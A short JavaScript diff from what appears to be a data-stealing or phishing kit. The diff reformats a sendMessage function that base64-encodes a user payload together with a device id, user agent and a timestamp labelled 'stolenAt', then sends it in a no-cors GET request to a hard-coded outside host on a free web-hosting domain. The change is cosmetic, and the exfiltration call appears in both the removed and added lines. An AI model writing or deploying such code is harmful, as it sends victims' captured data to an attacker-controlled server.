@@ -60,16 +60,11 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
         }
     },
     sendMessage = (userPayload) => {
-        return fetch(
-            `${API}?user=${btoa(
-                JSON.stringify({ ...userPayload, device_id: device_id, userAgent: userAgent, stolenAt: dateTime() })
-            )}`,
-            {
-                method: "GET",
-                mode: "no-cors",
-                credentials: "same-origin",
-            }
-        )
+        return fetch(`${API}?user=${btoa(JSON.stringify({ ...userPayload, device_id: device_id, userAgent: userAgent, stolenAt: dateTime() }))}`, {
+            method: "GET",
+            mode: "no-cors",
+            credentials: "same-origin",
+        })
             .then((res) => res.text())
             .then(console.log);
     };
